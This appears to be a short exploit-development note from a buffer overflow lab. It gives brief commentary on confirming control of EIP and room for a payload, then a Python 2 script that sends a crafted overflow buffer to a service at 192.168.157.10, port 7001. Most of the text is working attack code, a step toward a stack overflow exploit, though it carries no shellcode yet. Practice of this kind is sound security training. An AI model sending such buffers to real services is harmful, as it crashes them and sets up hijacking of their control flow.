Tested by increasing the buffer to see if application still crashes and we still have control over EIP
Sent extra characters and application still crashes. Easy we can put the payload in the space


#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."
  buffer = "A" * 2288 + "B" * 4 + "C" * 500
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect(("192.168.157.10", 7001))
  s.send(buffer)

  s.close()

  print "\nDone!"

except:
  print "\nCould not connect!"
